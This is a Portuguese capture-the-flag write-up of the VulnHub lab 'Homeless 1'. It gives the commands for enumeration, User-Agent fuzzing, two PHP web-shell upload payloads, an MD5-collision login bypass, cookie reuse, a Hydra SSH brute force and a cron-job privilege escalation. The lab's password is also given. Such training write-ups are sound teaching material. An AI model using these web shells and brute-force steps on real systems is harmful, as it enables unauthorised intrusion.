---
title: "VulnHub - Homeless 1"
tags: [Linux,Medium,Gobuster,BurpSuite,Wfuzz,Colisão MD5,Brute Force]
categories: VulnHub OSWE
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/inicial.png)

Link: [Homeless 1](https://www.vulnhub.com/entry/homeless-1,215/)

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.0/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/nmap.png)

Full ports scan

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/nmap1.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

> -T5 --> Modo insano

### Verificamos que temos 2 portas aberta no servidor

> Porta 80 -> Web

> Porta 22 -> SSH

## Enumeração da Porta 80

Abrimos pra ver do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/web.png)

Gobuster nela

```bash
gobuster dir -u http://192.168.56.130/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 30
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/gobuster.png)

## robots.txt

Acessamos o robots.txt pra ver o que podemos tirar dai

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/web1.png)

Bom... sabemos que esse não é o path real da pasta... e não temos mais nada de dica, então continuamos a enumerar a máquina

Olhando novamente o código fonte da página, verificamos algo interessante

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/web2.png)

Encontramos um aviso pra ler com atenção e um user agent... Isso não é normal de aparecer na página web

## BurpSuite

Jogamos a requisição para o BurpSuite para melhor trabalharmos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/burp.png)

Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/burp1.png)

Verificamos que conseguimos injetar qualquer coisa que quisermos no User Agent que ele vai ler lá no site

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/burp2.png)

Certo... agora temos que pensar um pouco...

Possivelmente a entrada do sucesso é alguma palavra na wordlist rockyou, e o campo onde podemos inserir algo está no User Agent

## Wfuzz User Agent

Então vamos fazer um brute force nele pra ver se sai algo

Obs: aqui eu utilizei uma wordlist menor pra provar que da certo, essa palavra `cyberdog` também está na rockyou, mas isso vai demorar bastante pra ser feito.

```bash
wfuzz -z file,word.txt -H "User-Agent: FUZZ" http://192.168.56.130/
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/wfuzz.png)

Acessando a página web com o User-Agent de `cyberdog` temos:

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/wfuzz1.png)

`Nice Cache!.. Go there.. myuploader_priv`

## myuploader_priv

Acessando, vemos do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/wfuzz2.png)

Jogamos para o Burp Suite novamente, para melhor conseguirmos trabalhar com esse upload, uma vez que possivelmente vai dar um pouco de trabalho

Enviamos nosso shell simples para teste

```php
<?php system($_GET['cmd']);?>
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/wfuzz3.png)

Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/wfuzz4.png)

Verificamos que o **arquivo é muito grande**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/wfuzz5.png)

Testando verifico que o máximo que ele suporta são 8 bytes, sim, 8 bytes...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/wfuzz6.png)

Agora vamos pesquisar algo menor que 8 bytes que nos de algum tipo de execução de comando

Tentei diversas coisas:

```php
<?=`$_GET[1]`?>
```

E o que funcionou foi:

```
<?=`ls`;
```

Duas referências para explicar isso: 

https://www.php.net/manual/en/language.operators.execution.php

https://www.php.net/manual/en/language.basic-syntax.phptags.php

Vemos que deu certo, conseguimos executar o ls lá, não conseguimos jogar nada mais pq o máximo que ele aceita são 8 bytes...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/wfuzz7.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/wfuzz8.png)

Verificamos esse novo diretório que foi passado...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/wfuzz9.png)

# Colisão de Hash Md5

Novo campo de login e senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/wfuzz10.png)

Clicamos em `Need a Hint` e realmente precisamos!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/wfuzz11.png)

Verificando o código que baixamos, temos uma surpresa

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/hash.png)

```php
        if (($username == $password ) or ($username == $code)  or ($password == $code)) {                                                                                                                        
                                                                                                                                                                                                                 
            echo 'Your input can not be the same.';                                                                                                                                                              
                                                                                                                                                                                                                 
        } else if ((md5($username) === md5($password) ) and (md5($password) === md5($code)) ) {                                                                                                                  
            $_SESSION["secret"] = '133720';                                                                                                                                                                      
            header('Location: admin.php');                                                                                                                                                                       
            exit();                      
```

Bom, eu não sou um especialista em criptografia, mas o que isso quer dizer? Que devemos ter três strings diferentes que resultam no mesmo hash md5 pra conseguir bypassar esse login

## Md5 Colision

Esse script aqui nos ajuda muito

https://github.com/thereal1024/python-md5-collision

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/col.png)

Clonamos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/col1.png)

Instalamos as bibliotecas necessárias

```bash
apt-get install libboost-all-dev
```

Agora executamos o script em python pra gerar as colisões

```bash
python3 gen_col_test.py
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/fast.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/fast1.png)

Gerado! Agora devemos passar para o servidor essas strings para ele nos dar acesso

Enviamos o ASCII e o binário através do Curl

```bash
curl --data-urlencode username@/root/VulnHub/Homeless-1/python-md5-collision/out_test_001.txt --data-urlencode password@/root/VulnHub/Homeless-1/python-md5-collision/out_test_002.txt --data-urlencode code@/root/VulnHub/Homeless-1/python-md5-collision/out_test_003.txt --data-urlencode "remember=1&login=Login" http://192.168.56.130/d5fa314e8577e3a7b8534a014b4dcb221de823ad/index.php -i
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/fast2.png)

Informações em: https://ec.haxx.se/http-post.html

## Session Hijacking

Pegamos o cookie

```
Set-Cookie: PHPSESSID=p3vregv64djkulkhqhqfun8ug0; path=/
```

Setamos ele no nosso navegado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/fast3.png)

Uma vez setado, conseguimos acessar o **admin.php**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/fast4.png)

Temos RCE!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/fast5.png)

Pegamos um reverse shell!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/fast6.png)

# www-data - Downfall

Então agora vamos começar nossa escalação de privilégio nessa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/down.png)

Aqui realmente não temos o que fazer, a única saida que consegui verificar foi um ataque de brute force no ssh desse usuário, não é o ideal, mas é o que podemos fazer...

Brute force em aplicações ssh pode ser muito complicado devido ao tempo que isso vai demorar, uma dica que o autor da máquina deu foi

```
"If you got big stuck, Try with Password start with "sec*"
```

Opa... tentar uma boa worldlist e sabemos que a senha dele começa com sec, possivelmente secret

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/senha.png)

Agora ligamos nosso hydra

```bash
hydra -l downfall -P senhas.txt ssh://192.168.56.130 -t 20
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/senha1.png)

Descobrimos a senha! `secretlyinlove`

Agora acessamos via SSH

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/ssh.png)

# Downfall - root

Agora vamos escalar privilégio para root

Verificamos os arquivos que temos na pasta do usuário

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/ssh1.png)

Verificamos esse arquivo "secreto" na pasta home do usuário que nos da a dica de um script em python

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/secret1.png)

Verificamos que podemos modificar ele... e o mais interessante verificamos que ele está no cron também

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/mail.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/mail1.png)

O que está acontecendo? Ele está executando esse script como se shell fosse, por isso não acha o import, temos que modificar ele (uma vez que somos parte do grupo que tem permissões) adicionando a shebang de python e um shell reverso

Verificamos a localização do python

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/python.png)

Adicionamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/python1.png)

Agora esperamos o próximo cron e viramos root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/python2.png)

Pegamos a flag

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-homeless/flag.png)








